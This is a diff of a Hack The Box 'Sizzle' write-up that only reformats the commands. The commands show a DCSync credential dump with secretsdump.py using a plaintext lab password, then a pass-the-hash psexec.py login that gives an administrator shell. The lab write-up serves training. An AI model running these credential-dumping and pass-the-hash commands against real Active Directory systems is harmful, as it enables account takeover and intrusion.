@@ -153,12 +153,12 @@ net use x: \\10.10.14.19\enox /user:enox enox
 
 ⇒ We will now perform dcsync attack using secretsdump as user mrkly as this user has GetChanges privileges :
 
-[**secretsdump.py](http://secretsdump.py/) HTB.local/mrlky:'Football#7'@10.10.10.103**
+`secretsdump.py HTB.local/mrlky:'Football#7'@10.10.10.103`
 
 ![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2020.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2020.png)
 
-⇒ We have got now the administrator NTLM hash which we can use with [psexec.py](http://psexec.py) to get a shell on the system as administrator
+⇒ We have got now the administrator NTLM hash which we can use with psexec.py to get a shell on the system as administrator
 
-[**psexec.py](http://psexec.py/) -hashes a:f6b7160bfc91823792e0ac3a162c9267 [administrator@10.10.10.103](mailto:administrator@10.10.10.103)**
+`psexec.py -hashes a:f6b7160bfc91823792e0ac3a162c9267 [administrator@10.10.10.103](mailto:administrator@10.10.10.103)`
 
 ![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2021.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2021.png)
